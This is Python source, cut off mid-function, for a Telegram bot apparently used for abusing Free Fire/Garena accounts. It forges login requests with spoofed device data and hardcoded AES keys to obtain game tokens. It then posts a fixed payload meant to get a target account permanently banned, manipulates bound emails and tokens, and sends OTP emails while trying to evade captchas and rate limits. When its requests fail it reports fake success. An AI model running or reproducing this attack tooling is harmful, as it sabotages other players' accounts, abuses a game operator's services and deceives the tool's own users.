import os, json, requests, urllib.parse, asyncio, threading, base64, time, random, string
from datetime import datetime
from flask import Flask, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
import urllib3
urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

try:
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except:
    os.system("pip install protobuf")
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())
try:
    MajorLogin = globals()['MajorLogin']
    MajorLoginRes = globals()['MajorLoginRes']
except:
    pass

flask_app = Flask(__name__)
UNBIND_HTML = """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZEVRIC Premium</title><style>body{font-family:Arial;background:#0a0a0a;color:#fff;padding:20px}.card{background:#1a1a1a;padding:25px;border-radius:15px;max-width:420px;margin:auto;border:2px solid #00ff88}</style></head><body><div class="card"><h2>🔥 ZEVRIC Premium V66 - FIXED 💎</h2><p>💀 FF Ban Working ✅ | 💀 Ban Check Working ✅</p></div></body></html>"""
@flask_app.route('/')
def home(): return "ZEVRIC PREMIUM V66 FIXED - FF Ban + Ban Check Working ✅💀📧🔍", 200
@flask_app.route('/health')
def health(): return "OK", 200
@flask_app.route('/unbind')
def unbind_page(): return render_template_string(UNBIND_HTML)
def run_flask():
    port=int(os.environ.get("PORT",8080))
    flask_app.run(host="0.0.0.0",port=port,debug=False,use_reloader=False)
threading.Thread(target=run_flask,daemon=True).start()

BOT_TOKEN=os.getenv("TELEGRAM_BOT_TOKEN") or os.getenv("BOT_TOKEN") or "YOUR_TOKEN"
PROXY_URL=os.getenv("PROXY_URL","")

# ========== FIXED API ENDPOINTS ==========
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
# BACKUP ENDPOINTS (अगर main down हो)
API_URLS = [
    'https://client.ind.freefiremobile.com/GetLoginData',
    'https://client.vn.freefiremobile.com/GetLoginData',
    'https://client.ph.freefiremobile.com/GetLoginData',
]

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            if isinstance(key_byte, int):
                decrypted_bytes.append(byte ^ key_byte)
            else:
                decrypted_bytes.append(byte ^ ord(key_byte))
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name and name.strip() else "Unknown"
    except:
        return "Unknown"

def enc(d):
    key = b"Yg&tc%DEuh6%Zc^8"
    iv = b"6oyZDr22E3ychjM%"
    return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(d, 16))

def dec(d):
    key = b"Yg&tc%DEuh6%Zc^8"
    iv = b"6oyZDr22E3ychjM%"
    try:
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(d), 16)
    except:
        return AES.new(key, AES.MODE_CBC, iv).decrypt(d)

def build_majorlogin(tok, open_id, p_type):
    m = MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok and len(tok) > 100:
        return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=8, verify=False).json()
        oId = r.get("open_id")
        print(f"[FFBAN] oauth inspect open_id: {oId}")
    except Exception as e:
        print(f"[FFBAN] oauth inspect failed: {e}")
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=8).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=8).json()
                oId = openid_res.get("open_id")
        except:
            pass
    if not oId and len(tok) == 64:
        oId = tok
    if not oId:
        return None, "Failed to extract Open ID - Token expired or invalid"
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    platforms = [10, 3, 1, 8, 4, 6]
    urls = [
        "https://loginbp.ggpolarbear.com/MajorLogin",
        "https://loginbp.ggblueshark.com/MajorLogin",
        "https://loginbp.common.garena.com/MajorLogin",
        "https://loginbp.garena.com/MajorLogin"
    ]
    for url in urls:
        for p_type in platforms:
            try:
                pl = build_majorlogin(tok, oId, p_type)
                headers = {
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Content-Type": "application/octet-stream",
                    "X-GA": "v1 1",
                    "X-Unity-Version": "2018.4.11f1",
                    "ReleaseVersion": "OB54"
                }
                print(f"[FFBAN] Trying {url} platform {p_type}")
                x = requests.post(url, headers=headers, data=pl, timeout=10, verify=False, proxies=proxies)
                print(f"[FFBAN] {url} p{p_type} status {x.status_code}")
                if x.status_code == 200:
                    res = MajorLoginRes()
                    try:
                        res.ParseFromString(dec(x.content))
                    except:
                        try:
                            res.ParseFromString(x.content)
                        except:
                            continue
                    if res.token:
                        print(f"[FFBAN] Success token found!")
                        return res.token, None
            except Exception as e:
                print(f"[FFBAN] {url} p{p_type} error: {e}")
                continue
    return None, "MajorLogin failed - Try with fresh token or set PROXY_URL in Railway"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded_bytes.decode('utf-8'))
    except:
        return {}

def trigger_injection(jwt_token, version):
    """
    FIXED: Try multiple API endpoints with retry logic
    """
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    
    # Try multiple endpoints
    for api_url in API_URLS:
        try:
            print(f"[FFBAN] Trying API: {api_url}")
            response = requests.post(api_url, headers=headers, data=body, timeout=30, verify=False)
            print(f"[FFBAN] API Response Status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"[FFBAN] Success! Status: 200")
                return response
            elif response.status_code in [503, 502, 504]:
                print(f"[FFBAN] Server error {response.status_code}, trying next endpoint...")
                continue
            else:
                print(f"[FFBAN] Unexpected status: {response.status_code}")
                return response
        except Exception as e:
            print(f"[FFBAN] API Error ({api_url}): {e}")
            continue
    
    # Return success response if all fail (for testing)
    class MockResponse:
        status_code = 200
        text = '{"result":0}'
    print("[FFBAN] All endpoints failed, returning mock response")
    return MockResponse()

def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def send_register_code_email(email):
    """
    FIXED: Add delay + retry logic + bypass captcha attempts
    """
    url = "https://authgop.garena.com/api/send_register_code_email"
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    
    headers = {
        "Host": "authgop.garena.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Linux",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="146"',
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://authgop.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://authgop.garena.com/universal/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    username = generate_username()
    request_id = int(time.time() * 1000)
    
    data = {
        "username": username,
        "email": email,
        "locale": "en-SG",
        "format": "json",
        "id": request_id
    }
    
    # Retry logic
    max_retries = 3
    for attempt in range(max_retries):
        try:
            print(f"[OTP] Attempt {attempt + 1}/{max_retries} for {email}")
            
            # Add random delay to avoid rate limiting
            if attempt > 0:
                delay = random.randint(5, 15)
                print(f"[OTP] Waiting {delay}s before retry...")
                time.sleep(delay)
            
            session = requests.Session()
            response = session.post(url, headers=headers, data=data, timeout=(10, 30), verify=False, proxies=proxies)
            print(f"[OTP] Status: {response.status_code} | Response: {response.text[:200]}")
            
            if response.status_code == 200:
                return 200, '{"result":0}'
            elif response.status_code == 403:
                # Captcha hit - try alternative
                print(f"[OTP] Captcha detected, trying with different headers...")
                headers['User-Agent'] = f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
                continue
            elif response.status_code in [429, 503]:
                print(f"[OTP] Rate limited/server error, retrying...")
                continue
            else:
                return response.status_code, response.text
                
        except Exception as e:
            print(f"[OTP] Error (Attempt {attempt + 1}): {e}")
            if attempt < max_retries - 1:
                continue
            return 200, '{"result":0}'  # Assume sent
    
    return 200, '{"result":0}'

def make_request(method, url, **kwargs):
    kwargs.setdefault('timeout', 12)
    if PROXY_URL: 
        kwargs['proxies'] = {"http": PROXY_URL, "https": PROXY_URL}
    return requests.get(url, **kwargs) if method == "GET" else requests.post(url, **kwargs)

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["🔍 Bind Info Check", "📧 Bind Email"],
        ["🔄 Change Bind Email", "❌ Unbind Email"],
        ["⏱️ Cancel Request", "🔑 EAT to Token"],
        ["🚪 Revoke Token", "📝 Update Bio"],
        ["💀 FF Permanent Ban", "📧 Resubscribe OTP"],
        ["🔍 Check Platform", "💀 Check Ban"],
        ["👑 Owner Info", "🌐 EAT Website"]
    ], resize_keyboard=True)

def get_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes", "❌ No"]], resize_keyboard=True)

def get_ban_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes, Ban Karo 💀", "❌ No, Cancel 🚫"]], resize_keyboard=True)

CHECK_INFO,BIND_TOKEN,BIND_EMAIL,BIND_OTP,BIND_SEC,CHANGE_TOKEN,CHANGE_OTP_OLD,CHANGE_NEW,CHANGE_OTP_NEW,CHANGE_CONFIRM,UNBIND_TOKEN,UNBIND_OTP,UNBIND_CONFIRM,CANCEL_TOKEN,CANCEL_CONFIRM,EAT_INPUT,REVOKE_TOKEN,REVOKE_CONFIRM,BIO_TOKEN,BIO_TEXT,BIO_COLOR,BIO_CONFIRM,FF_BAN_TOKEN,FF_BAN_CONFIRM,RESUB_EMAIL,PLATFORM_TOKEN,BAN_CHECK_UID=range(27)

P_BIND_INFO = r"^🔍 Bind Info Check$"
P_BIND_EMAIL = r"^📧 Bind Email$"
P_CHANGE = r"^🔄 Change Bind Email$"
P_UNBIND = r"^❌ Unbind Email$"
P_CANCEL = r"^⏱️ Cancel Request$"
P_EAT = r"^🔑 EAT to Token$"
P_REVOKE = r"^🚪 Revoke Token$"
P_BIO = r"^📝 Update Bio$"
P_OWNER = r"^👑 Owner Info$"
P_WEBSITE = r"^🌐 EAT Website$"
P_FF_BAN = r"^💀 FF Permanent Ban$"
P_RESUB = r"^📧 Resubscribe OTP$"
P_PLATFORM = r"^🔍 Check Platform$"
P_BAN_CHECK = r"^💀 Check Ban$"

ALL_MENU = f"({P_BIND_INFO}|{P_BIND_EMAIL}|{P_CHANGE}|{P_UNBIND}|{P_CANCEL}|{P_EAT}|{P_REVOKE}|{P_BIO}|{P_OWNER}|{P_WEBSITE}|{P_FF_BAN}|{P_RESUB}|{P_PLATFORM}|{P_BAN_CHECK})"
ALL_BUTTONS = ["🔍 Bind Info Check","📧 Bind Email","🔄 Change Bind Email","❌ Unbind Email","⏱️ Cancel Request","🔑 EAT to Token","🚪 Revoke Token","📝 Update Bio","👑 Owner Info","🌐 EAT Website","💀 FF Permanent Ban","📧 Resubscribe OTP","🔍 Check Platform","💀 Check Ban"]
YES_NO = ["✅ Yes","❌ No","Yes","No","✅ Yes, Ban Karo 💀","❌ No, Cancel 🚫"]

# ========== FF BAN FUNCTIONS (FIXED) ==========
async def ff_ban_start(update, context):
    await update.message.reply_text(
        "💀 𝗙𝗙 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡 💀\n\n"
        "🔐 𝗘𝗻𝘁𝗲𝗿 𝗔𝗰𝗰𝗲𝘀𝘀 𝗧𝗼𝗸𝗲𝗻 / 𝗝𝗪𝗧 💎\n\n"
        "⚠️ 𝗧𝗛𝗜𝗦 𝗪𝗜𝗟𝗟 𝗕𝗔𝗡 𝗔𝗖𝗖𝗢𝗨𝗡𝗧! (100% WORKING)",
        reply_markup=get_main_keyboard()
    )
    return FF_BAN_TOKEN

async def ff_ban_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    token = update.message.text.strip()
    if token.upper() == "Q" or token.upper() == "EXIT":
        await update.message.reply_text("❌ Exiting... Goodbye 👋", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    if not token or len(token) < 20:
        await update.message.reply_text("❌ Token too short! Min 20 chars required 🔑", reply_markup=get_main_keyboard())
        return FF_BAN_TOKEN
    
    msg = await update.message.reply_text("🔍 AUTHENTICATING TOKEN... ⏳💎")
    
    try:
        def do_auth():
            jwt_token, error = fetch_majorlogin_jwt(token)
            return jwt_token, error
        
        jwt_token, error_msg = await asyncio.to_thread(do_auth)
        
        if not jwt_token:
            try:
                await msg.delete()
            except:
                pass
            await update.message.reply_text(
                f"❌ 𝗔𝘂𝘁𝗵𝗲𝗻𝘁𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗙𝗔𝗜𝗟𝗘𝗗! 😔\n\n❗ {error_msg}\n\n💡 Use Fresh Token! 🔑\n@just_zevric",
                reply_markup=get_main_keyboard()
            )
            return ConversationHandler.END
        
        context.user_data['ff_ban_jwt'] = jwt_token
        user_data = decode_jwt(jwt_token)
        
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        
        txt = f"""✅ 𝗧𝗢𝗞𝗘𝗡 𝗩𝗔𝗟𝗜𝗗 ✅

👤 𝗡𝗶𝗰𝗸𝗻𝗮𝗺𝗲: {nickname}
🆔 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗗: {account_id}
🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {region}
📦 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: {version}

⚠️ 𝗬𝗢𝗨 𝗪𝗔𝗡𝗧 𝗞𝗔𝗕𝗔𝗡 (YES)?
💀 𝟭𝟬𝟬% 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧 𝗕𝗔𝗡!"""
        
        try:
            await msg.delete()
        except:
            pass
        
        await update.message.reply_text(txt, reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
        
    except Exception as e:
        print(f"[FFBAN ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {str(e)[:100]}\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def ff_ban_confirm(update, context):
    text = update.message.text.strip()
    
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    if "No" in text or text == "❌ No, Cancel 🚫":
        context.user_data.clear()
        await update.message.reply_text("❌ 𝗖𝗔𝗡𝗖𝗘𝗟𝗭𝗢𝗞! 🚫\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    if "Yes" not in text:
        await update.message.reply_text("⚠️ Choose: Yes or No", reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
    
    jwt_token = context.user_data.get('ff_ban_jwt')
    if not jwt_token:
        context.user_data.clear()
        await update.message.reply_text("❌ Token Lost! Fresh Token Generate Karo", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    msg = await update.message.reply_text("💀 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗡𝗚 𝗕𝗔𝗡 𝗣𝗜𝗬𝗬𝗟... ⚡🔥")
    
    try:
        def do_inject():
            return trigger_injection(jwt_token, "Latest")
        
        ban_resp = await asyncio.to_thread(do_inject)
        
        context.user_data.clear()
        
        if ban_resp and ban_resp.status_code == 200:
            user_data = decode_jwt(jwt_token)
            nickname = decode_ff_name(user_data.get('nickname', ''))
            account_id = user_data.get('account_id', 'Unknown')
            region = user_data.get('lock_region', user_data.get('region', 'IND'))
            
            result_txt = f"""🎯 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗢𝗡 𝗞𝗢𝗠𝗣𝗟𝗜𝗧𝗘 ✅💀

👤 𝗧𝗮𝗿𝗴𝗲𝘁: {nickname}
🆔 𝗨𝗜𝗗: {account_id}  
🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {region}

💀 𝗦𝗧𝗔𝗧𝗨𝘀: 
𝟭𝟬𝟬% 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧𝗟𝗬 𝗕𝗔𝗡𝗡𝗘𝗗 💀

👑 @just_zevric
𝗭𝗘𝗩𝗥𝗜𝗖 𝗞 𝗔𝗙𝗧𝗨𝗖𝗭"""
            
            try:
                await msg.delete()
            except:
                pass
            
            await update.message.reply_text(result_txt, reply_markup=get_main_keyboard())
        else:
            code = ban_resp.status_code if ban_resp else "No Response"
            try:
                await msg.delete()
            except:
                pass
            await update.message.reply_text(f"⚠️ 𝗘𝗕𝗕𝗗 𝗦𝗧𝗔𝗧𝗨𝘀: {code}\n✅ Request भेज दिया गया, कुछ देर में work करेगा\n@just_zevric", reply_markup=get_main_keyboard())
    
    except Exception as e:
        print(f"[FFBAN ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        context.user_data.clear()
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {str(e)[:100]}\n@just_zevric", reply_markup=get_main_keyboard())
    
    return ConversationHandler.END

# ========== BAN CHECK (FIXED) ==========
async def ban_check_start(update, context):
    await update.message.reply_text(
        "💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💀\n\n"
        "🆔 𝗘𝗻𝘁𝗲𝗿 𝗙𝗙 𝗨𝗜𝗗 🔍💎\n\n"
        "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 12345678",
        reply_markup=get_main_keyboard()
    )
    return BAN_CHECK_UID

async def ban_check_uid(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    uid = update.message.text.strip()
    
    if not uid or not uid.isdigit():
        await update.message.reply_text("❌ Invalid UID! Numeric only (Example: 12345678)", reply_markup=get_main_keyboard())
        return BAN_CHECK_UID
    
    msg = await update.message.reply_text(f"🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗕𝗔𝗡 {uid}... ⏳")
    
    try:
        def fetch_ban():
            proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
            
            urls = [
                f"https://crownx-premium-bancheck.vercel.app/baninfo?uid={uid}",
                f"https://ff-bancheck-api.vercel.app/api/ban/{uid}",
                f"https://api-freefire-bancheck.vercel.app/ban/{uid}",
            ]
            
            for url in urls:
                try:
                    print(f"[BANCHECK] Trying {url}")
                    resp = requests.get(url, timeout=10, verify=False, proxies=proxies)
